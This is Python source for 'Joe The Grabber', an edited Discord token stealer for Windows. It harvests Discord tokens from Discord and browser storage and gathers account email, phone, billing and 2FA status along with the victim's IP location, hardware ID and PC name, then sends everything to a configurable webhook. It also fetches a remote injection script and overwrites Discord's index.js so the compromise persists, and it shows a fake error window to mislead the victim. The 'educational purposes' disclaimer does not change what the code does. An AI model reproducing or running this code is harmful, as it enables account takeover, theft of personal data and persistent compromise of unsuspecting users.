import os
if os.name != "nt":
	exit()
from re import findall
import json
import psutil
import platform as plt
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import datetime
from tkinter import *
from PIL import ImageTk,Image

#Config/Stuff To Edit
window = True #True = There Will Be Custom Window When Script Is Opened. False = There Will not be anything when it starts
webhook_url = "YOUR_WEBHOOK_HERE" #Replace "YOUR_WEBHOOK_HERE" with your webhook link 

#Window Setting (Gets Ignored is Window Is False)
windowname = "PROCESS_NAME_HERE" #Repalce PROCESS_NAME_HERE with name of the procces that will be (faked) stoped
customicon = True #True = There Will Be Custom Icon In Window. Flase = There Will Be Default Tkinter Icon In Window.
#ˆ to change customicon go to assets folder and change icon.ico (YOU MUST KEEP THE NAME AND FILE TYPE else it will not work)




#Code And Stuff You shoud not edit if you dont know what are you doing
setimg = "./assets/error.png"

#List Of Langs
languages = {
	'da'    : 'Danish, Denmark',
	'de'    : 'German, Germany',
	'en-GB' : 'English, United Kingdom',
	'en-US' : 'English, United States',
	'es-ES' : 'Spanish, Spain',
	'fr'    : 'French, France',
	'hr'    : 'Croatian, Croatia',
	'lt'    : 'Lithuanian, Lithuania',
	'hu'    : 'Hungarian, Hungary',
	'nl'    : 'Dutch, Netherlands',
	'no'    : 'Norwegian, Norway',
	'pl'    : 'Polish, Poland',
	'pt-BR' : 'Portuguese, Brazilian, Brazil',
	'ro'    : 'Romanian, Romania',
	'fi'    : 'Finnish, Finland',
	'sv-SE' : 'Swedish, Sweden',
	'vi'    : 'Vietnamese, Vietnam',
	'tr'    : 'Turkish, Turkey',
	'cs'    : 'Czech, Czechia, Czech Republic',
	'el'    : 'Greek, Greece',
	'bg'    : 'Bulgarian, Bulgaria',
	'ru'    : 'Russian, Russia',
	'uk'    : 'Ukranian, Ukraine',
	'th'    : 'Thai, Thailand',
	'zh-CN' : 'Chinese, China',
	'ja'    : 'Japanese',
	'zh-TW' : 'Chinese, Taiwan',
	'ko'    : 'Korean, Korea'
}

#Paths where to Look for Discord Data/Info to grabe
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
	"Discord"           : ROAMING + "\\Discord",
	"Discord Canary"    : ROAMING + "\\discordcanary",
	"Discord PTB"       : ROAMING + "\\discordptb",
	"Google Chrome"     : LOCAL + r"\\Google\\Chrome\\User Data\\Default",
	"Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
	"Brave"             : LOCAL + r"\\BraveSoftware\\Brave-Browser\\User Data\\Default",
	"Yandex"            : LOCAL + r"\\Yandex\\YandexBrowser\\User Data\\Default"
}
#Comment Here
def getheaders(token=None, content_type="application/json"):
	headers = {
		"Content-Type": content_type,
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
	}
	if token:
		headers.update({"Authorization": token})
	return headers
#Find User Token
def getuserdata(token):
	try:
		return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
	except:
		pass
#Get Location Of Where Was Token Found
def gettokens(path):
	path += "\\Local Storage\\leveldb"
	tokens = []
	for file_name in os.listdir(path):
		if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
			continue
		for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
			for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
				for token in findall(regex, line):
					tokens.append(token)
	return tokens

def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]

#Get IP/Location
def getip():
	ip = org = loc = city = country = region = googlemap = "None"
	try:
		url = 'http://ipinfo.io/json'
		response = urlopen(url)
		data = json.load(response)
		ip = data['ip']
		org = data['org']
		loc = data['loc']
		city = data['city']
		country = data['country']
		region = data['region']
		googlemap = "https://www.google.com/maps/search/google+map++" + loc
	except:
		pass
	return ip,org,loc,city,country,region,googlemap

#Get Avatar
def getavatar(uid, aid):
	url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
	try:
		urlopen(Request(url))
	except:
		url = url[:-4]
	return url

#Has Payment Methods
def has_payment_methods(token):
	try:
		return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
	except:
		pass

#Sortning Every Thing For Sending
def main():
	embeds = []
	working = []
	checked = []
	working_ids = []
	computer_os = plt.platform()
	ip,org,loc,city,country,region,googlemap = getip()
	pc_username = os.getenv("UserName")
	pc_name = os.getenv("COMPUTERNAME")
	for platform, path in PATHS.items():
		if not os.path.exists(path):
			continue
		for token in gettokens(path):
			if token in checked:
				continue
			checked.append(token)
			uid = None
			if not token.startswith("mfa."):
				try:
					uid = b64decode(token.split(".")[0].encode()).decode()
				except:
					pass
				if not uid or uid in working_ids:
					continue
			user_data = getuserdata(token)
			if not user_data:
				continue
			working_ids.append(uid)
			working.append(token)
			username = user_data["username"] + "#" + str(user_data["discriminator"])
			user_id = user_data["id"]
			locale = user_data['locale']
			avatar_id = user_data["avatar"]
			avatar_url = getavatar(user_id, avatar_id)
			email = user_data.get("email")
			phone = user_data.get("phone")
			verified = user_data['verified']
			mfa_enabled = user_data['mfa_enabled']
			flags = user_data['flags']
			creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y・%H:%M:%S')
			language = languages.get(locale)
			if not language:
				language = "Failed to get language"
			#Does User Have Nitro Or Payment Method Added
			nitro = bool(user_data.get("premium_type"))
			billing = bool(has_payment_methods(token))
			#Final Embed
			embed = {
				"color": 16507654,
				"fields": [
					{
						"name": "**Account Info**",
						"value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
						"inline": True
					},
					{
						"name": "**Pc Info**",
						"value": f'OS: {computer_os}\nUsername: {pc_username}\nPc Name: {pc_name}\nHwid:\n{gethwid()}',
						"inline": True
					},
					{
						"name": "--------------------------------------------------------------------------------------------------",
						"value":"-----------------------------------------------------------------------------------------------",
						"inline": False
					},
					{
						"name": "**IP**",
						"value": f'IP: {ip}\nMap location: [{loc}]({googlemap})\nCity: {city}\nRegion: {region}\nOrg: {org}',
						"inline": True
					},
					{
						"name": "**Other Info**",
						"value": f'Locale: {locale} ({language})\nToken Location: {platform}\nEmail Verified: {verified}\n2fa Enabled: {mfa_enabled}\nCreation Date: {creation_date}',
						"inline": True
					},
					{
						"name": "**Token**",
						"value": f"`{token}`",
						"inline": False
					}
				],
				"author": {
					"name": f"{username}・{user_id}",
					"icon_url": avatar_url
				},
				"footer": {
					"text": "Joe The Grabber By Mr. Pekr・https//mrpekr.github.io"
				}
			}
			embeds.append(embed)

	if len(working) == 0:
		working.append('123')
	#Info About Webhook
	webhook = {
		"content": "",
		"embeds": embeds,
		"username": "Joe The Grabber",
		"avatar_url": "https://cdn.discordapp.com/attachments/757601990686671001/888077754967392306/thumb_nvykin-new-york-accent-get-a-load-of-this-guy-15081753.png"
	}
	try:
		urlopen(Request(webhook_url, data=dumps(webhook).encode(), headers=getheaders()))
	except:
		pass
#Sending Webhook
	try:
		for root, dirs, files in os.walk(os.getenv("LOCALAPPDATA")):
			for name in dirs:
				if (name.__contains__("discord_desktop_core-")):
					directory_list = os.path.join(root, name+"\\discord_desktop_core\\index.js")
					os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Hazard"))
					f = urlopen("https://raw.githubusercontent.com/Rdimo/Injection/master/Injection-clean")
					index_content = f.read()
					with open(directory_list, 'wb') as index_file:
						index_file.write(index_content)
					with open(directory_list, 'r+') as index_file2:
						replace_string = index_file2.read().replace("%WEBHOOK_LINK%", webhook_url)
					with open(directory_list, 'w'): pass
					with open(directory_list, 'r+') as index_file3:
						index_file3.write(replace_string)
		for root, dirs, files in os.walk(os.getenv("APPDATA")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"):
			for name in files:
				discord_file = os.path.join(root, name)
				os.startfile(discord_file)
	except:
		pass

#Errors
try:
	main()
except Exception as e:
    embeds2 = []
    webhook2 = {
		"content": "",
		"embeds": embeds2,
		"username": "Joe Err",
		"avatar_url": "https://cdn.discordapp.com/attachments/828047793619861557/884194764159848458/pixlr-bg-result_10.png"
	}
    embed2 = {
		"color": 15007744,
        "author": {
            "name": "Woopsie daisy",
            "icon_url": "https://cdn.discordapp.com/attachments/828047793619861557/884194764159848458/pixlr-bg-result_10.png",
            "url": "https://github.com/Rdimo/Hazard-Nuker#important"
        },
        "description": f"**Joe The Grabber Caught Error:**\n```fix\n{e}```\n They ran the file but Seems like Hazard couldn't grab their info :(",
        }
    embeds2.append(embed2)    
    urlopen(Request(webhook_url, data=dumps(webhook2).encode(), headers=getheaders()))
    pass

def customwindow():
	#Creating Root So Tk can be used
	root = Tk()

	#Sets Window Size
	root.geometry("400x250")

	#Math Shit
	Tk_Width = 400
	Tk_Height = 250

	#Calculates Size Of Screen To Determin Center
	x_Left = int(root.winfo_screenwidth()/2 - Tk_Width/2)
	y_Top = int(root.winfo_screenheight()/2 - Tk_Height/2)
	

	root.title("Error " + windowname + " Has Stoped")

	img = ImageTk.PhotoImage(Image.open(setimg))

	#Creating Text
	myLabel1 = Label(image=img).pack()
	myLabel2 = Label(root, text="We Are Sorry But The Process Stoped").pack()
	myLabel2 = Label(root, text="You can Try Again By Pressing: Try Again").pack()

	#Putting Window To Center 
	root.geometry("+{}+{}".format(x_Left, y_Top))

	#Def For Custom Icon
	def Icon():
		root.iconbitmap("./assets/icon.ico")	

	#Activates Def For Icon (Only if customicon is True)
	if customicon:
		Icon()

	#Creating Buttons
	myButton1 = Button(root, text="Try Again", state=DISABLED).pack() #Fake Button
	myButton2 = Button(root, text="Ok", command=quit).pack() #Button That Turns Off The Script

	#Looping Procces So It Works
	root.mainloop()

if window:
	customwindow()

#-------------------------
#  _   _       _       
# | \ | |     | |      
# |  \| | ___ | |_ ___ 
# | . ` |/ _ \| __/ _ \
# | |\  | (_) | ||  __/
# |_| \_|\___/ \__\___|
#-------------------------
#Made By: Rdimo#6969・https://github.com/Rdimo/Hazard-Token-Grabber
#Edited By: Mr. Pekr・https://mrpekr.github.io
#Made For Educational purposes only
#---------------------------------------------------
#  _____  _          _       _                     
# |  __ \(_)        | |     (_)                    
# | |  | |_ ___  ___| | __ _ _ _ __ ___   ___ _ __ 
# | |  | | / __|/ __| |/ _` | | '_ ` _ \ / _ \ '__|
# | |__| | \__ \ (__| | (_| | | | | | | |  __/ |   
# |_____/|_|___/\___|_|\__,_|_|_| |_| |_|\___|_|   
#---------------------------------------------------                                                 
#I Mr. Pekr Or Rdimo#6969 Is NOT responsible for any Use For malicious porupuses.
#----------------------------------------
#___  ___        _____    _ _ _       
#|  \/  |       |  ___|  | (_) |      
#| .  . |_   _  | |__  __| |_| |_ ___ 
#| |\/| | | | | |  __|/ _` | | __/ __|
#| |  | | |_| | | |__| (_| | | |_\__ \
#\_|  |_/\__, | \____/\__,_|_|\__|___/
#         __/ |                       
#        |___/                        
#----------------------------------------
#Removed Password Logger (From My Tests Didnt Work)
#Added Comments
#Added Window After Running Script
#Some Rebranding
#All basic stuff like grabber it self is NOT MADE BY ME its made by the original creator im only editing this script.         


#Original: https://github.com/Rdimo/Hazard-Token-Grabber